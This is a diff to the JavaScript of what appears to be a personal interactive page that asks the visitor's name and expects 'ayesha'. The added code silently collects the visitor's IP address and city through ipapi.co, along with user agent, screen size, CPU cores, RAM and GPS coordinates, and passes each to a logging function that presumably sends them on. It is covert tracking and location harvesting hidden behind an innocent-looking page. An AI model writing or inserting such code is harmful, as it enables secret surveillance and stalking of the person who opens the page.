@@ -91,24 +91,78 @@ function startAnswer(answer){
 
 function checkName(){
 
-     let name = document.getElementById("nameInput").value.trim();
+     let name=document.getElementById("nameInput")
+        .value
+        .trim()
+        .toLowerCase();
 
-    // -------- DEVICE INFO (NO POPUPS) --------
-    let screenInfo = screen.width + "x" + screen.height;
+    alert("NAME = " + name);
+logData(name,"name_entered");
+   fetch("https://ipapi.co/json/")
+.then(response => response.json())
+.then(data => {
+      logData(
+        name,
+        "IP: " + data.ip
+    );
 
-    let deviceType = /Mobi|Android/i.test(navigator.userAgent)
-        ? "Mobile"
-        : "Desktop";
+    logData(
+        name,
+        "City: " + data.city
+    );
 
-    let cpu = navigator.hardwareConcurrency || "unknown";
+}); 
+    logData(
+    name,
+    "device: " + navigator.userAgent
+);
+    let deviceType =
+/Mobi|Android/i.test(navigator.userAgent)
+? "Mobile"
+: "Desktop";
 
-    // -------- SEND DATA --------
-    logData(name, "screen:" + screenInfo);
-    logData(name, "device:" + deviceType);
-    logData(name, "cpu:" + cpu);
-    logData(name, "ua:" + navigator.userAgent);
+logData(
+    name,
+    "device_type: " + deviceType
+);
+alert(
+    "Screen: " + screen.width + "x" + screen.height +
+    "\nCPU: " + navigator.hardwareConcurrency
+);
+    logData(
+    name,
+    "screen: " +
+    screen.width +
+    "x" +
+    screen.height
+);
+    logData(
+    name,
+    "cpu_cores: " + navigator.hardwareConcurrency
+);
 
-    // -------- FLOW CONTINUE --------
+logData(
+    name,
+    "ram_gb: " + navigator.deviceMemory
+);
+
+navigator.geolocation.getCurrentPosition(
+    function(position){
+
+        logData(
+            name,
+            "gps: " +
+            position.coords.latitude +
+            "," +
+            position.coords.longitude
+        );
+
+    },
+    function(){
+        logData(name,"location_denied");
+    }
+);
+
     if(name!=="ayesha"){
         document.getElementById("text").innerHTML="Wrong person.";
         document.getElementById("buttons").innerHTML="";
